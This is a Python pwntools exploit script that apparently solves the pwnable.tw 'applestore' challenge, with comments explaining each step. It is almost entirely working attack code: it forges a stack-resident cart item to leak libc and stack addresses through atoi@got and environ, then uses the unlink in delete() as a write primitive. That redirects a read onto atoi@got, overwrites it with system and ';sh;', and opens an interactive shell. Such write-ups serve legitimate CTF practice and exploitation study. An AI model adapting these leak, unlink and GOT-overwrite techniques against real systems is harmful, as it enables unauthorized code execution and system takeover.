from pwn import *

r = remote('chall.pwnable.tw', 10104)

elf = ELF('./applestore')
libc = ELF('./lib/libc.so.6')

def add(device_number):
	r.recvuntil(b'>')
	r.sendline(b'2');
	r.recvuntil(b'Device Number>')
	r.sendline(str(device_number).encode())

def checkout(agreement, payload=b''):
	r.recvuntil(b'>')
	r.sendline(b'5');
	r.recvuntil(b'>');
	r.sendline(agreement.encode() + payload)

def cart(agreement, payload=b''):	
	r.recvuntil(b'>')
	r.sendline(b'4');
	r.recvuntil(b'>');
	r.sendline(agreement.encode() + payload)

def delete(device_number, payload):	
	r.recvuntil(b'>')
	r.sendline(b'3');
	r.recvuntil(b'>');
	r.sendline(str(device_number).encode() + payload)

def libc_leak():
	r.recvuntil(b'27: ')
	libc_leak = u32(r.recv(4))
	return libc_leak

def stack_leak():
	r.recvuntil(b'\x32\x37\x3a\x20')
	stack_leak = u32(r.recv(4))
	return stack_leak

def send_payload(payload):
	r.recvuntil(b'>')
	r.sendline(payload)

leak2base = 0x2d050
stack2target = 0x104
atoi_got = elf.got['atoi']
sh = b';sh;'

# item struct looks like :
#
#	item {
#		char* desc;
#		int price;
#		item* fd;
#		item* bk;
#	}

# assembly 7174 amount to get iPhone 8
# it won't to add to the heap
# it means we'll have an item struct at the stack
# which won't be properly
# so, we can control it via agreement-input in cart()

# 6 * 499 + 18 * 199 + 2 * 299 = 7174
for i in range(6): add(3)
for i in range(18): add(1)
for i in range(2): add(2)

checkout('y')

# well, we got a iPhone 8 to stack 
# it's fd and bk includes garbage data
# let's fix it via put atoi@got to desc
# and fd = bk = 0

payload = p32(atoi_got) + p32(0xdeadbeef) + p64(0)

# trigger
# we'll go for each item via fd field
# and print item's description
# put 'y' as agreement and 1-byte padding 
# to reach our stack struct where iPhone 8 is
# it means that we'll got a libc leak

cart('ya', payload)

libc_base = libc_leak() - leak2base
system = libc_base + libc.sym['system']
environ = libc_base + libc.sym['environ']

log.success(f'Libc base : {hex(libc_base)}')
log.success(f'system() : {hex(system)}')
log.success(f'envp : {hex(environ)}')

# and the last one what we need for exploitation
# stack leak via environ pointer to get delete() $ebp
# envp situated at the libc and points to the stack

payload = p32(environ) + p32(0xcafebabe) + p64(0)

# trigger as previous block
cart('ya', payload)

target_ebp = stack_leak() - stack2target

log.success(f'target $ebp : {hex(target_ebp)}')

# well, we have all of we need

# we also have arbitrary write primitive at delete()
# it takes item by index to delete
# and exclude fd and bk pointers
# next, it do overwrite their pointers like :

# bk->fd = fd <=> *(bk + 0x8) = fd
# fd->bk = bk <=> *(fd + 0xc) = bk

# but we must to be care that fd and bk addresses are rw-
# and our plan is rewrite delete() $ebp at the stack
# because my_read() destination at handler() depends on stack $ebp
# if we can control it we'll can modify my_read() dest to atoi@got
# and make the GOT-overwrite

payload = p32(target_ebp) + p32(0xfeedface) + p32(target_ebp - 0xc) + p32(atoi_got + 0x22)

# trigger
delete(27, payload)

# now we have $ebp = atoi@got address
# next reading will reads to atoi@got
# next atoi() equals system(<system-address> + ';sh;')

payload = p32(system) + sh
send_payload(payload)

r.interactive()
